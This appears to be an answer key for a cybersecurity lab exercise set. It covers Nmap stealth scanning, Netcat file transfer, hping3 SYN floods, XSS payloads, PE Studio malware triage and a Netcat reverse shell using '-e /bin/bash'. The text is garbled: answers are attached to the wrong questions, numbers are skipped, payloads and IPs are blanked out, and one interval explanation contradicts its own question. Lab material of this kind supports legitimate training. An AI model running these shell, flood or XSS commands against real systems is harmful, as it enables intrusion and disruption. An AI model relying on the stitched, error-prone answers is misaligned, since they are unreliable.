**1. Perform a stealth scan on the target IP without establishing a full TCP connection. Which Nmap command would you use, and why is it preferred over a full connect scan?**

- **Command:**  
  ```
  nmap -sS 
  ```
- **Explanation:**  
  The `-sS` option performs a SYN scan (stealth scan), sending SYN packets and analyzing responses without completing the TCP handshake. This is preferred over a full connect scan (`-sT`) because it is less likely to be logged by the target system, making detection harder.

---

**2. Use Netcat to transfer a file from one machine to another. Set up one machine to listen for incoming connections and the second machine to send the file over the network. Describe the exact commands you would use.**

- **On the receiving machine (listener):**  
  ```
  nc -l -p 1234 > receivedfile.txt
  ```
- **On the sending machine:**  
  ```
  nc  1234  
  ```
- **Explanation:**  
  `--flood` sends packets as fast as possible, `--rand-source` randomizes the source IP, `-S` sets the SYN flag.

---

**4. You're told that this page might be vulnerable to DOM XSS. Someone says to try putting something after ?default= in the URL. Can you make an alert box appear just by changing the URL?**

- **Yes, if the page reflects the value of `default` into the DOM without sanitization, you can use:**  
  ```
  ?default=alert(1)
  ```
- **Explanation:**  
  If the input is unsanitized and inserted into the DOM, this will trigger an alert box.

---

**5. Upload the suspicious .exe file to VirusTotal and note the detection ratio along with malware names from different antivirus engines. Then manually open the file using PE Studio and investigate hidden functionalities, suspicious libraries, and anomalies. Determine whether the manual analysis supports or contradicts the VirusTotal results.**

- **Process:**  
  - Upload to VirusTotal, note detection ratio and malware names.
  - Analyze with PE Studio: check suspicious imports (e.g., networking, process injection), hidden strings, section entropy, and anomalies.
  - **Conclusion:** If both tools indicate similar suspicious behavior (e.g., networking, obfuscation), the results support each other. If VirusTotal flags malware but PE Studio finds nothing suspicious, results may contradict.

---

**6. You test another form. This one blocks the word ``, but allows you to use other HTML tags. Can you still make a popup appear using a different tag?**

- **Yes. Example:**  
  ```
  
  ```
- **Explanation:**  
  The `onerror` event triggers JavaScript when the image fails to load, causing a popup.

---

---

**11. You are provided with two different suspicious .exe files. Analyze both files using PE Studio and VirusTotal. Compare their behavior indicators and characteristics, then conclude which of the two appears to be more dangerous. Justify your conclusion based on specific analysis points.**

- **Process:**  
  - Compare detection ratios, flagged behaviors, suspicious imports, and anomalies.
  - The more dangerous file will have higher detection, more suspicious imports (e.g., networking, code injection), and obfuscation techniques.
  - **Justification:** Choose the file with more critical flags and behaviors.

---

**12. Think about the same kind of popup as in the first challenge - but now it's saved and shows every time the page loads.**

  ```
- **Explanation:**  
  `-A` enables OS detection, version detection, script scanning, and traceroute.

---

**16. Simulate a slow-rate SYN flood by sending one SYN packet every 10 milliseconds to port 80. Write the Hping3 command to perform this.**

- **Command:**  
  ```
  hping3 -S -i u10 -p 80 
  ```
- **Explanation:**  
  `-i u10` sets interval to 10 microseconds; adjust as needed for milliseconds.

---

**17. Set up a Netcat listener that can first receive a file and then upgrade to a remote shell without restarting the connection.**

- **Process:**  
  - Use a script or manual delimiter to switch from file transfer to shell.
  - Example: After file transfer, send a shell payload or use a named pipe.

---

  ```
  nc -l -p 4444
  ```
- **Victim (reverse shell):**  
  ```
  nc  4444 -e /bin/bash
  ```
- **(On Windows, use `cmd.exe` instead of `/bin/bash`.)**

---

**22. Without using any online scanners, perform a complete static analysis of the suspicious .exe file using PE Studio. Identify any suspicious imported libraries, hidden strings, anomalies in headers, and anti-debugging techniques. Based solely on your local analysis, determine the most probable malware category for the file.**

- **Process:**  
  - Check for imports like `WinExec`, `CreateRemoteThread`, networking APIs.
  - Look for suspicious or obfuscated strings.
  - Analyze PE headers for anomalies.
  - Check for anti-debugging code.
  - **Conclusion:** Classify as Trojan, backdoor, ransomware, etc., based on findings.
